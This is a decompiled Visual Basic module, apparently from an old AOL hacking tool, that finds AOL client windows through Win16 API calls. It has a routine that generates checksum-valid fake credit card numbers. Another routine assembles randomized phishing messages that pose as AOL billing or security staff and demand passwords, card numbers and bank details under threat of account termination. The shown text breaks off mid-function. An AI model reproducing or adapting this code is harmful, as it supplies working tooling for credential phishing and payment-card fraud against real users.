' Module1
Option Explicit
Declare Sub extsub3DD0 Lib "APIGuide.dll" Alias "agCopyData" ()
Declare Sub extsub3E08 Lib "APIGuide.dll" Alias "agCopyData" ()
Declare Function extfn4188 Lib "APIGuide.dll" Alias "agDeviceCapabilities" () As Long
Declare Function extfn41C0 Lib "APIGuide.dll" Alias "agDeviceMode" () As Integer
Declare Sub extsub3E40 Lib "APIGuide.dll" Alias "agDWordTo2Integers" ()
Declare Function extfn41F8 Lib "APIGuide.dll" Alias "agExtDeviceMode" () As Integer
Declare Function extfn3F90 Lib "APIGuide.dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn3FC8 Lib "APIGuide.dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn4000 Lib "APIGuide.dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn3F58 Lib "APIGuide.dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn4038 Lib "APIGuide.dll" Alias "agGetAddressForVBString" () As Long
Declare Function extfn3EE8 Lib "APIGuide.dll" Alias "agGetControlHwnd" () As Integer
Declare Function extfn4070 Lib "APIGuide.dll" Alias "agGetControlName" () As String
Declare Function extfn3F20 Lib "APIGuide.dll" Alias "agGetInstance" () As Integer
Declare Function extfn3BA0 Lib "APIGuide.dll" Alias "AgGetStringFromLPSTR" (ByVal p1&) As String
Declare Function extfn42A0 Lib "APIGuide.dll" Alias "agHugeOffset" () As Long
Declare Function extfn4230 Lib "APIGuide.dll" Alias "agInp" () As Integer
Declare Function extfn4268 Lib "APIGuide.dll" Alias "agInpw" () As Integer
Declare Sub extsub3E78 Lib "APIGuide.dll" Alias "agOutp" ()
Declare Sub extsub3EB0 Lib "APIGuide.dll" Alias "agOutpw" ()
Declare Function extfn42D8 Lib "APIGuide.dll" Alias "agVBGetVersion" () As Integer
Declare Function extfn4310 Lib "APIGuide.dll" Alias "agVBSendControlMsg" () As Long
Declare Function extfn4348 Lib "APIGuide.dll" Alias "agVBSetControlFlags" () As Long
Declare Function extfn40A8 Lib "APIGuide.dll" Alias "agXPixelsToTwips" () As Long
Declare Function extfn4118 Lib "APIGuide.dll" Alias "agXTwipsToPixels" () As Integer
Declare Function extfn40E0 Lib "APIGuide.dll" Alias "agYPixelsToTwips" () As Long
Declare Function extfn4150 Lib "APIGuide.dll" Alias "agYTwipsToPixels" () As Integer
Declare Function extfn2C50 Lib "311.Dll" Alias "AOLGetList" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn2D30 Lib "User" Alias "AppendMenu" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4 As Any) As Integer
Declare Function extfn3350 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn3778 Lib "User" Alias "ArrangeIconicWindow" () As Integer
Declare Function extfn3D28 Lib "GDI" Alias "BitBlt" () As Integer
Declare Sub extsub4AB8 Lib "User" Alias "closewindow" ()
Declare Function extfn3318 Lib "User" Alias "CreateMenu" () As Integer
Declare Function extfn2CF8 Lib "User" Alias "CreatePopupMenu" () As Integer
Declare Function extfn4968 Lib "GDI" Alias "CreateSolidBrush" () As Integer
Declare Function extfn4D20 Lib "bubble.dll" Alias "DeleteBubble" () As Integer
Declare Function extfn2D68 Lib "User" Alias "DeleteMenu" (ByVal p1%, ByVal p2%, ByVal p3%) As Integer
Declare Function extfn4A80 Lib "User" Alias "destroywindow" () As Integer
Declare Sub extsub2C18 Lib "User" Alias "Drawmenubar" (ByVal p1%)
Declare Function extfn4380 Lib "APIGuide.dll" Alias "dwVBSetControlFlags" () As Long
Declare Function extfn3890 Lib "User" Alias "ENumChildWindow" () As Integer
Declare Function extfn3270 Lib "User" Alias "ExitWindow" () As Integer
Declare Function extfn2DD8 Lib "User" Alias "ExitWindows" () As Integer
Declare Function extfn2F60 Lib "User" Alias "FindWindow" () As Integer
Declare Function extfn2F98 Lib "User" Alias "SendMessage" () As Long
Declare Function extfn3040 Lib "User" Alias "SetWindowText" () As Integer
Declare Function extfn3008 Lib "vbwfind.dll" Alias "findchildbytitle" () As Integer
Declare Function extfn2F28 Lib "vbwfind.dll" Alias "FindChildByClass" () As Integer
Declare Function extfn3D98 Lib "vbwfind.dll" Alias "FindChild" () As Integer
Declare Function extfn4D90 Lib "vbwfind.dll" Alias "FindChildByClass" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn4D58 Lib "vbwfind.dll" Alias "findchildbytitle" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn2EB8 Lib "User" Alias "FindWindow" (ByVal p1 As Any, ByVal p2 As Any) As Integer
Declare Function extfn3200 Lib "User" Alias "FindWindow" () As Integer
Declare Function extfn3238 Lib "User" Alias "FindWindow" () As Integer
Declare Function extfn3078 Lib "User" Alias "FlashWindow" () As Integer
Declare Function extfn3CB8 Lib "GDI" Alias "FloodFill" () As Integer
Declare Function extfn34D8 Lib "User" Alias "GetActiveWindow" () As Integer
Declare Function extfn3660 Lib "User" Alias "GetClassName" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn3158 Lib "User" Alias "GetClassWord" () As Integer
Declare Function extfn4A48 Lib "User" Alias "GetCurrentTime" () As Long
Declare Function extfn3628 Lib "User" Alias "GetCursor" () As Integer
Declare Function extfn49A0 Lib "User" Alias "GetDC" () As Integer
Declare Function extfn3820 Lib "User" Alias "GetDeskTopWindow" () As Integer
Declare Function extfn3C48 Lib "GDI" Alias "GetDeviceCaps" () As Integer
Declare Function extfn49D8 Lib "User" Alias "getfocus" () As Integer
Declare Function extfn39E0 Lib "Kernel" Alias "getfreespace" () As Long
Declare Function extfn3120 Lib "User" Alias "getfreesystemresources" (ByVal p1%) As Integer
Declare Function extfn2CC0 Lib "User" Alias "GetMenu" (ByVal p1%) As Integer
Declare Function extfn4AF0 Lib "User" Alias "GetMenuItemCount" (ByVal p1%) As Integer
Declare Function extfn4B98 Lib "User" Alias "GetMenuItemID" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn37B0 Lib "User" Alias "GetMenuState" () As Integer
Declare Function extfn4B28 Lib "User" Alias "GetMenuString" (ByVal p1%, ByVal p2%, ByVal p3$, ByVal p4%, ByVal p5%) As Integer
Declare Function extfn32E0 Lib "User" Alias "GetMessage" () As Integer
Declare Function extfn36D0 Lib "User" Alias "GetNextDlgTabItem" () As Integer
Declare Function extfn31C8 Lib "User" Alias "getnextwindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn4DC8 Lib "User" Alias "GetParent" (ByVal p1%) As Integer
Declare Function extfn3B68 Lib "Kernel" Alias "GetPrivateProfileInt" () As Integer
Declare Function extfn3A88 Lib "Kernel" Alias "GetPrivateProfileString" (ByVal p1$, ByVal p2$, ByVal p3$, ByVal p4$, ByVal p5%, ByVal p6$) As Integer
Declare Function extfn3AC0 Lib "Kernel" Alias "GetProfileInt" () As Integer
Declare Function extfn3AF8 Lib "Kernel" Alias "GetProfileString" (ByVal p1$, ByVal p2$, ByVal p3$, ByVal p4$, ByVal p5%) As Integer
Declare Function extfn35F0 Lib "User" Alias "GetScrollPos" () As Integer
Declare Sub extsub4A10 Lib "User" Alias "GetScrollRange" ()
Declare Function extfn4BD0 Lib "User" Alias "GetSubMenu" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn3548 Lib "User" Alias "GetSysModalWindow" () As Integer
Declare Function extfn3A18 Lib "Kernel" Alias "GetSystemDirectory" () As Integer
Declare Function extfn3698 Lib "User" Alias "GetSystemMenu" () As Integer
Declare Function extfn37E8 Lib "User" Alias "GetSystemMetrics" () As Integer
Declare Function extfn3740 Lib "User" Alias "GetTopWindow" (ByVal p1%) As Integer
Declare Function extfn39A8 Lib "Kernel" Alias "GetVersion" () As Long
Declare Function extfn4C40 Lib "User" Alias "GetWindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn48F8 Lib "User" Alias "GetWindowDC" () As Integer
Declare Function extfn3938 Lib "Kernel" Alias "GetWindowDirectory" () As Integer
Declare Function extfn2DA0 Lib "Kernel" Alias "GetWindowsDirectory" (ByVal p1$, ByVal p2%) As Integer
Declare Function extfn3430 Lib "User" Alias "GetWindowText" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn3708 Lib "User" Alias "GetWindowTextLength" (ByVal p1%) As Integer
Declare Function extfn3468 Lib "User" Alias "GetWindowWord" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn3970 Lib "Kernel" Alias "GetWinFlags" () As Long
Declare Function extfn2EF0 Lib "User" Alias "InsertMenu" () As Integer
Declare Function extfn35B8 Lib "User" Alias "IsWindowVisible" () As Integer
Declare Function extfn3900 Lib "Kernel" Alias "lStrln" () As Integer
Declare Function extfn3D60 Lib "MMSystem" Alias "MciSendString" () As Long
Declare Sub extsub2E80 Lib "User" Alias "Movewindow" ()
Declare Function extfn4700 Lib "VBMsg.Vbx" Alias "ptConvertUShort" () As Long
Declare Sub extsub43F0 Lib "VBMsg.Vbx" Alias "ptCopyTypeToAddress" ()
Declare Function extfn47A8 Lib "VBMsg.Vbx" Alias "ptGetControlModel" () As Long
Declare Function extfn47E0 Lib "VBMsg.Vbx" Alias "ptGetControlName" () As String
Declare Function extfn4540 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn4578 Lib "VBMsg.Vbx" Alias "ptGetIntegerFromAddress" () As Integer
Declare Function extfn4508 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn45B0 Lib "VBMsg.Vbx" Alias "ptGetLongFromAddress" () As Long
Declare Function extfn44D0 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn45E8 Lib "VBMsg.Vbx" Alias "ptGetStringFromAddress" () As String
Declare Function extfn4498 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Sub extsub43B8 Lib "VBMsg.Vbx" Alias "ptGetTypeFromAddress" ()
Declare Function extfn4460 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn4690 Lib "VBMsg.Vbx" Alias "ptHiWord" () As Integer
Declare Function extfn4658 Lib "VBMsg.Vbx" Alias "ptLoWord" () As Integer
Declare Function extfn4620 Lib "VBMsg.Vbx" Alias "ptMakelParam" () As Long
Declare Function extfn46C8 Lib "VBMsg.Vbx" Alias "ptMakeUShort" () As Integer
Declare Function extfn4738 Lib "VBMsg.Vbx" Alias "ptMessagetoText" () As String
Declare Function extfn4770 Lib "VBMsg.Vbx" Alias "ptRecreateControlHwnd" () As Long
Declare Sub extsub4428 Lib "VBMsg.Vbx" Alias "ptSetControlModel" ()
Declare Sub extsub3C10 Lib "GDI" Alias "Rectangle" ()
Declare Function extfn48C0 Lib "User" Alias "ReleaseDC" () As Integer
Declare Function extfn4930 Lib "GDI" Alias "SelectObject" () As Integer
Declare Function extfn4C78 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, p4 As Any) As Long
Declare Function extfn4CB0 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4&) As Long
Declare Function extfn4CE8 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4$) As Long
Declare Function extfn38C8 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4$) As Long
Declare Function extfn3510 Lib "User" Alias "SetActiveWindow" () As Integer
Declare Sub extsub3BD8 Lib "GDI" Alias "SetBKColor" ()
Declare Function extfn3190 Lib "User" Alias "SetClassWord" () As Integer
Declare Sub extsub30E8 Lib "User" Alias "SetCursorPos" ()
Declare Function extfn4B60 Lib "User" Alias "SetFocus" (ByVal p1%) As Integer
Declare Function extfn32A8 Lib "User" Alias "SetParent" () As Integer
Declare Function extfn3580 Lib "User" Alias "SetSysModalWindow" () As Integer
Declare Function extfn3CF0 Lib "GDI" Alias "SetTextColor" () As Long
Declare Function extfn2FD0 Lib "User" Alias "SetWindowPos" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4%, ByVal p5%, ByVal p6%, ByVal p7%) As Integer
Declare Function extfn34A0 Lib "User" Alias "SetWindowText" () As Integer
Declare Sub extsub30B0 Lib "User" Alias "ShowOwnedPopups" ()
Declare Function extfn2E10 Lib "User" Alias "showwindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn2E48 Lib "MMSystem" Alias "sndplaysound" (ByVal p1$, ByVal p2%) As Integer
Declare Function extfn3858 Lib "User" Alias "SwapMouseButton" () As Integer
Declare Function extfn4C08 Lib "APIGuide.dll" Alias "AgGetStringFromLPSTR" () As String
Declare Function extfn3C80 Lib "GDI" Alias "TextOut" () As Integer
Declare Function extfn2C88 Lib "User" Alias "TrackPopupMenu" () As Integer
Declare Sub extsub4888 Lib "User" Alias "UpdateWindow" ()
Declare Function extfn4818 Lib "VBRun300.Dll" Alias "VarPtr" () As Long
Declare Function extfn4850 Lib "VBStr.Dll" Alias "vbeNumChildWindow" () As Integer
Declare Function extfn3388 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn33F8 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn33C0 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn3A50 Lib "Kernel" Alias "WritePrivateProfileString" (ByVal p1$, ByVal p2$, ByVal p3$, ByVal p4$) As Integer
Declare Function extfn3B30 Lib "Kernel" Alias "WriteProfileString" () As Integer

Function fn1018 () As Variant
Dim l0B72 As Integer
Dim l0B74 As String
Dim l0B76 As Variant
Dim l0B7A As Variant
Dim l0B7E As Variant
Dim l0B82 As String
Dim l0B84 As Variant
l0B72 = extfn4D90(fn410(), "AOL Child")

L82EA:
l0B74$ = fn2B38(l0B72)
    If Left(l0B74$, 9) = "Welcome, " Then Let l0B76 = l0B76 + 1
If l0B76 = 1 Then
  l0B7A = InStr(l0B74$, " ")
  l0B7E = InStr(l0B74$, "!")
  Let l0B82$ = Mid$(l0B74$, l0B7A + 1, l0B7E - l0B7A - 1)
  fn1018 = Trim(l0B82$)
  Exit Function
End If
Let l0B76 = 0
l0B72 = extfn31C8(l0B72, 2)
If l0B72 = extfn4C40(l0B72, l0B84) Then
   fn1018 = 0
   Exit Function
End If
GoTo L82EA
End Function

Function fn1050 () As Variant
Dim l0B8C As Integer
Dim l0B8E As Integer
Dim l0B90 As Integer
Dim l0B92 As Variant
Dim l0B96 As Variant
l0B90% = extfn2EB8("AOL Frame25", 0&)
l0B8E = extfn4D90(l0B90%, "AOL Child")

L84A2:
l0B8C = extfn4D58(l0B8E, "Send")
    If l0B8C <> 0 Then Let l0B92 = l0B92 + 1
l0B8C = extfn4D58(l0B8E, "To:")
    If l0B8C <> 0 Then Let l0B92 = l0B92 + 1
l0B8C = extfn4D58(l0B8E, "Available?")
    If l0B8C <> 0 Then Let l0B92 = l0B92 + 1
If l0B92 = 3 Then
  fn1050 = l0B8E
  Exit Function
End If
Let l0B92 = 0
l0B8E = extfn31C8(l0B8E, 2)
If l0B8E = extfn4C40(l0B8E, l0B96) Then
   fn1050 = 0
   Exit Function
End If
GoTo L84A2
End Function

Function fn1088 (p0B9C() As Integer, ByVal pv0BA2 As Integer, ByVal p0BA4 As String, ByVal p0BA6 As String, p0BA8 As Variant) As Integer
Dim l0BAC As Integer
Dim l0BAE As String
Dim l0BB0 As String
Dim l0BB2 As Variant
Dim l0BB6 As Integer
Static m0BB8 As Integer
Static m0BBA As Integer
   If m0BB8 = 0 Then
      m0BBA = 0
      ReDim p0B9C(0 To 0)
      If pv0BA2 = 0 Then pv0BA2 = extfn3820()
   End If
   m0BB8 = m0BB8 + 1
   l0BAC = extfn4C40(pv0BA2, 5)
   Do Until l0BAC = 0
      DoEvents
      l0BB6 = fn1088(p0B9C(), l0BAC, p0BA4, p0BA6, p0BA8)
      l0BAE = Space(255)
      l0BB6 = extfn3430(l0BAC, l0BAE, 255)
      l0BAE = Left(l0BAE, l0BB6)
      l0BB0 = Space(255)
      l0BB6 = extfn3660(l0BAC, l0BB0, 255)
      l0BB0 = Left(l0BB0, l0BB6)
      If extfn4DC8(l0BAC) <> 0 Then
         l0BB6 = extfn3468(l0BAC, (-12))
         l0BB2 = CLng("&H" & Hex(l0BB6))
      Else
         l0BB2 = Null
      End If
      If l0BAE Like p0BA4 And l0BB0 Like p0BA6 Then
         If IsNull(p0BA8) Then
            m0BBA = m0BBA + 1
            ReDim Preserve p0B9C(0 To m0BBA)
            p0B9C(m0BBA) = l0BAC
         ElseIf Not IsNull(l0BB2) Then
            If l0BB2 = CLng(p0BA8) Then
               m0BBA = m0BBA + 1
               ReDim Preserve p0B9C(0 To m0BBA)
               p0B9C(m0BBA) = l0BAC
            End If
         End If
      End If
      l0BAC = extfn4C40(l0BAC, 2)
   Loop
   m0BB8 = m0BB8 - 1
   fn1088 = m0BBA
End Function

Function fn10C0 (p0BBE As String) As String
On Error Resume Next
fn10C0 = Trim(Left$(p0BBE, InStr(p0BBE, Chr$(0)) - 1))
End Function

Function fn10F8 (p0BC4 As Variant) As Variant
Dim l0BC8 As Variant
Dim l0BCC As Variant
l0BC8 = Int(p0BC4)
l0BCC = (Val(p0BC4) - Val(l0BC8))
fn10F8 = l0BCC
End Function

Function fn1168 () As Variant
Dim l0BDC As Variant
Dim l0BE0 As Variant
Dim l0BE4 As Variant
Dim l0BE8 As Variant
Dim l0BEC As Variant
Dim l0BF0 As Variant
Dim l0BF4 As Variant
Dim l0BF8 As Variant
Dim l0BFC As Variant
Dim l0C00 As Variant
Dim l0C04 As Variant
Dim l0C08 As Variant
Dim l0C0C As Variant
Dim l0C10 As Variant
Dim l0C14 As Variant
Dim l0C18 As Variant
Dim l0C1C As Variant
Dim l0C20 As Variant
Dim l0C24 As Variant
Dim l0C28 As String
Dim l0C2A As String
Dim l0C2C As String
Dim l0C2E As String
Dim l0C30 As String
Dim l0C32 As String
Dim l0C34 As String
Dim l0C36 As String
Dim l0C38 As String
Dim l0C3A As String
Dim l0C3C As String
Dim l0C3E As String
Dim l0C40 As String
Dim l0C42 As String
Dim l0C44 As String
Dim l0C46 As String
Dim l0C48 As Variant
Dim l0C4C As Variant
Dim l0C50 As Variant
Dim l0C54 As Variant
Dim l0C58 As Variant
Dim l0C5C As Variant
Dim l0C60 As Variant
Dim l0C64 As Variant
Dim l0C68 As Variant
Dim l0C6C As Variant
Dim l0C70 As Variant
Dim l0C74 As String
L897E:
l0BDC = 0
Randomize Timer
l0BE0 = 99 * Rnd
Do
If Val(l0BE0) = 10 Then l0BE0 = l0BE0 - (Int(10 * Rnd))
If Val(l0BE0) < 10 Then GoTo L8A28
If l0BE0 > 10 Then
l0BE0 = l0BE0 - Int(10 * Rnd)
End If
Loop Until l0BE0 < 10
L8A28:
l0BE4 = 4
l0BE8 = Int(Val(l0BE0) * Rnd)
l0BEC = Int(Val(l0BE0) * Rnd)
l0BF0 = Int(Val(l0BE0) * Rnd)
l0BF4 = Int(Val(l0BE0) * Rnd)
l0BF8 = Int(Val(l0BE0) * Rnd)
l0BFC = Int(Val(l0BE0) * Rnd)
l0C00 = Int(Val(l0BE0) * Rnd)
l0C04 = Int(Val(l0BE0) * Rnd)
l0C08 = Int(Val(l0BE0) * Rnd)
l0C0C = Int(Val(l0BE0) * Rnd)
l0C10 = Int(Val(l0BE0) * Rnd)
l0C14 = Int(Val(l0BE0) * Rnd)
l0C18 = Int(Val(l0BE0) * Rnd)
l0C1C = Int(Val(l0BE0) * Rnd)
l0C20 = Int(Val(l0BE0) * Rnd)
l0C14 = Int(Val(l0BE0) * Rnd)
l0C18 = Int(Val(l0BE0) * Rnd)
l0C1C = Int(Val(l0BE0) * Rnd)
l0C20 = Int(Val(l0BE0) * Rnd)
l0C24 = 0
L8BE4:
Do
l0C28$ = l0BE4
l0C2A$ = l0BE8
l0C2C$ = l0BEC
l0C2E$ = l0BF0
l0C30$ = l0BF4
l0C32$ = l0BF8
l0C34$ = l0BFC
l0C36$ = l0C00
l0C38$ = l0C04
l0C3A$ = l0C08
l0C3C$ = l0C0C
l0C3E$ = l0C10
l0C40$ = l0C14
l0C42$ = l0C18
l0C44$ = l0C1C
l0C46$ = l0C20
l0C48 = Val(l0C2A$) + Val(l0C2E$) + Val(l0C32$) + Val(l0C36$) + Val(l0C3A$) + Val(l0C3E$) + Val(l0C42$) + Val(l0C46$)
l0C4C = l0C28$
l0C50 = l0C2C$
l0C54 = l0C30$
l0C58 = l0C34$
l0C5C = l0C38$
l0C60 = l0C3C$
l0C64 = l0C40$
l0C68 = l0C44$
l0C4C = Val(l0C4C) + Val(l0C4C)
l0C50 = Val(l0C50) + Val(l0C50)
l0C54 = Val(l0C54) + Val(l0C54)
l0C58 = Val(l0C58) + Val(l0C58)
l0C5C = Val(l0C5C) + Val(l0C5C)
l0C60 = Val(l0C60) + Val(l0C60)
l0C64 = Val(l0C64) + Val(l0C64)
l0C68 = Val(l0C68) + Val(l0C68)
If l0C4C > 9 Then l0C4C = l0C4C - 9
If l0C50 > 9 Then l0C50 = l0C50 - 9
If l0C54 > 9 Then l0C54 = l0C54 - 9
If l0C58 > 9 Then l0C58 = l0C58 - 9
If l0C5C > 9 Then l0C5C = l0C5C - 9
If l0C60 > 9 Then l0C60 = l0C60 - 9
If l0C64 > 9 Then l0C64 = l0C64 - 9
If l0C68 > 9 Then l0C68 = l0C68 - 9
l0BDC = 1 + l0BDC
If l0BDC = 10 Then GoTo L897E
l0C6C = Val(l0C4C) + Val(l0C50) + Val(l0C54) + Val(l0C58) + Val(l0C5C) + Val(l0C60) + Val(l0C64) + Val(l0C68)
If Int((l0C6C + l0C48) / 60) = (l0C6C + l0C48) / 60 Then GoTo L9080
l0C70 = 60
If l0C24 = 0 Then l0C20 = -1
l0C20 = l0C20 + 1
If l0C20 > 10 Then
l0C14 = Int(10 * Rnd)
l0C18 = Int(Val(l0BE0) * Rnd)
l0C1C = Int(Val(l0BE0) * Rnd)
l0C20 = Int(Val(l0BE0) * Rnd)
l0C24 = 0
GoTo L8BE4
End If
l0C24 = 1
Loop
L9080:
l0C74$ = l0BE4 & l0BE8 & l0BEC & l0BF0 & "-" & l0BF4 & l0BF8 & l0BFC & l0C00 & "-" & l0C04 & l0C08 & l0C0C & l0C10 & "-" & l0C14 & l0C18 & l0C1C & l0C20
fn1168 = l0C74$
End Function

Function fn11A0 () As String
Dim l0C78 As Variant
Dim l0C7C As Variant
Dim l0C80 As String
Randomize
    l0C78 = 7
    l0C7C = Int(Rnd * l0C78 + 1)
      If l0C7C = 1 Then l0C80$ = "Hello, "
      If l0C7C = 2 Then l0C80$ = "Good evening, "
      If l0C7C = 3 Then l0C80$ = "Hello, And welcome to America Online. "
      If l0C7C = 4 Then l0C80$ = "Welcome to America Online. "
      If l0C7C = 5 Then l0C80$ = "Excuse me, "
      If l0C7C = 6 Then l0C80$ = "Dear User, "
      If l0C7C = 7 Then l0C80$ = "What's Up! "
    l0C78 = 7
    l0C7C = Int(Rnd * l0C78 + 1)
      If l0C7C = 1 Then l0C80$ = l0C80$ & "I am with America Online Billing "
      If l0C7C = 2 Then l0C80$ = l0C80$ & "I am with OTC (Online Techincal Consultants) "
      If l0C7C = 3 Then l0C80$ = l0C80$ & "I am with WWWC (World Wide Web Consultants) "
      If l0C7C = 4 Then l0C80$ = l0C80$ & "I am with AOL Techincal Staff "
      If l0C7C = 5 Then l0C80$ = l0C80$ & "I am with AOL System Security "
      If l0C7C = 6 Then l0C80$ = l0C80$ & "I am with AOL Resource Department "
      If l0C7C = 7 Then l0C80$ = l0C80$ & "I am with the AOL Community Action Team "
    l0C78 = 7
    l0C7C = Int(Rnd * l0C78 + 1)
      If l0C7C = 1 Then l0C80$ = l0C80$ & "and due to Technical Failures "
      If l0C7C = 2 Then l0C80$ = l0C80$ & "and due to Billing errors "
      If l0C7C = 3 Then l0C80$ = l0C80$ & "and due to Line Noise "
      If l0C7C = 4 Then l0C80$ = l0C80$ & "and due to A virus in our database "
      If l0C7C = 5 Then l0C80$ = l0C80$ & "and due to Massive data flow in our database "
      If l0C7C = 6 Then l0C80$ = l0C80$ & "and due to data corruption "
      If l0C7C = 7 Then l0C80$ = l0C80$ & "and due to hackers by-passing out systems "
    l0C78 = 5
    l0C7C = Int(Rnd * l0C78 + 1)
      If l0C7C = 1 Then l0C80$ = l0C80$ & "we seem to have lost your password. "
      If l0C7C = 2 Then l0C80$ = l0C80$ & "we seem to have lost your account information. "
      If l0C7C = 3 Then l0C80$ = l0C80$ & "we seem to have failed to recieve your logon password. "
      If l0C7C = 4 Then l0C80$ = l0C80$ & "we seem to have failed to recieve your account information. "
      If l0C7C = 5 Then l0C80$ = l0C80$ & "we have lost your Credit Card information. "
    l0C78 = 4
    l0C7C = Int(Rnd * l0C78 + 1)
      If l0C7C = 1 Then l0C80$ = l0C80$ & "To correct this situation please click respond and enter "
      If l0C7C = 2 Then l0C80$ = l0C80$ & "Please click respond and enter your "
      If l0C7C = 3 Then l0C80$ = l0C80$ & "Please help us by entering your "
      If l0C7C = 4 Then l0C80$ = l0C80$ & "Please respond with your "
    l0C78 = 3
    l0C7C = Int(Rnd * l0C78 + 1)
      If l0C7C = 1 Then l0C80$ = l0C80$ & "Your password information."
      If l0C7C = 2 Then l0C80$ = l0C80$ & "Your current account password."
      If l0C7C = 3 Then l0C80$ = l0C80$ & "Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number."
    l0C78 = 4
    l0C7C = Int(Rnd * l0C78 + 1)
      If l0C7C = 1 Then l0C80$ = l0C80$ & " Please respond within 2 minutes too keep this account active."
      If l0C7C = 2 Then l0C80$ = l0C80$ & " It is very important that you respond immediately."
      If l0C7C = 3 Then l0C80$ = l0C80$ & " Please respond as soon as possible "
      If l0C7C = 4 Then l0C80$ = l0C80$ & " Incooperation may lead to termination of your account."
    l0C78 = 4
    l0C7C = Int(Rnd * l0C78 + 1)
      If l0C7C = 1 Then l0C80$ = l0C80$ & " Thank you for using America Online."
      If l0C7C = 2 Then l0C80$ = l0C80$ & " Thank you for your time."
      If l0C7C = 3 Then l0C80$ = l0C80$ & " Thank you for your cooperation."
      If l0C7C = 4 Then l0C80$ = l0C80$ & " Thank you for your help and enjoy the service!"
fn11A0 = l0C80$
End Function

Function fn11D8 (p0C86 As Integer, ByVal p0C88 As String, p0C8A As Integer) As Variant
Dim l0C8C As Integer
Dim l0C8E As Variant
Dim l0C92 As Integer
Dim l0C94 As String
Dim l0C96 As Integer
l0C8C = 0
l0C8E = (p0C8A)
DoEvents
l0C92% = extfn4D90(p0C86%, p0C88$)
l0C8C = l0C8C + 1
Do
DoEvents
If l0C8C = p0C8A Then
fn11D8 = l0C92%
Exit Function
End If
DoEvents
Do
DoEvents
l0C92% = extfn4C40(l0C92%, gc05CA)
l0C94$ = String(255, 0)
l0C96% = extfn3660(l0C92%, l0C94$, 254)
l0C94$ = fnBF0(l0C94$)
If l0C94$ = p0C88$ Then l0C8C = l0C8C + 1
If l0C8C = p0C8A Then Exit Do
Loop Until l0C94$ = p0C88$
Loop Until l0C8C = p0C8A
fn11D8 = l0C92%
End Function

Function fn1210 (p0C9C As Variant) As Variant
Dim l0CA0 As Integer
Dim l0CA2 As String
Dim l0CA4 As Integer
l0CA0% = extfn3708(p0C9C)
l0CA2$ = String$(l0CA0%, 0)
l0CA4% = extfn3430(p0C9C, l0CA2$, (l0CA0% + 1))
fn1210 = l0CA2$
End Function

Function fn1248 () As String
Dim l0CA8 As Variant
Dim l0CAC As Integer
Dim l0CAE As Variant
Dim l0CB2 As String
Dim l0CB4 As Variant
Dim l0CB8 As String
l0CAC% = fn988()
If l0CAC% = 0 Then Exit Function
l0CAE = extfn4CB0(l0CAC%, gc05CC, 0, 0)
l0CA8 = Space(l0CAE)
l0CA8 = Trim$(l0CB2$)
For l0CB4 = Len(l0CB2$) To 1 Step -1
    l0CB8$ = Mid$(l0CB2$, l0CB4)
    l0CB8$ = Mid$(l0CB8$, 1, 1)
    If l0CB8$ = Chr$(13) Then
        l0CA8 = Mid$(l0CB2$, l0CB4, Len(l0CB2$))
        Exit For
    End If
Next
fn1248 = l0CB2$
End Function

Function fn1280 (p0CBE As Variant) As Variant
Dim l0CC2 As String
Dim l0CC4 As Integer
l0CC2$ = String$(250, 0)
l0CC4% = extfn3660(p0CBE, l0CC2$, 250)
fn1280 = l0CC2$
End Function

Function fn12B8 (p0CCA As Variant) As Variant
Dim l0CCE As Long
    l0CCE = extfn3970()
    If l0CCE And gc01FA Then
        p0CCA = "486"
        ElseIf l0CCE And gc01F8 Then
            p0CCA = "386"
            ElseIf l0CCE And gc01F6 Then
                p0CCA = "286"
                Else
                    p0CCA = "Other"
    End If
End Function

Function fn12F0 (p0CD2 As String) As String
    fn12F0 = LTrim$(RTrim$(UCase$(InputBox$(p0CD2, "Enter File Name"))))
End Function

Function fn1328 (p0CD8 As Variant) As Variant
    p0CD8 = Format$(extfn3120(gc01F0)) + "%"
End Function

Function fn1360 (p0CE0 As Variant) As Variant
    p0CE0 = Format$(extfn3120(gv01EE)) + "%"
End Function

Function fn1398 (p0CE8 As Variant) As Variant
    p0CE8 = Format$(extfn3120(gc01F2)) + "%"
End Function

Function fn13D0 (ByVal p0CF0 As String) As Variant
Dim l0CF2 As Integer
Do
l0CF2 = l0CF2 + 1
Loop Until Mid(p0CF0, Len(p0CF0) - l0CF2, 1) = Chr(13)
fn13D0 = Right(p0CF0, l0CF2)
End Function

Function fn14B0 () As Variant
Dim l0D26 As Integer
Dim l0D28 As Integer
Dim l0D2C As String * 255
Dim l0D2E As String
Dim l0D30 As Variant
Dim l0D34 As String
l0D26% = extfn2EB8("AOL Frame25", 0&)
l0D28% = extfn4D58(l0D26%, ">Instant Message From: ")
l0D30 = extfn3430(l0D28%, l0D2C, 255)
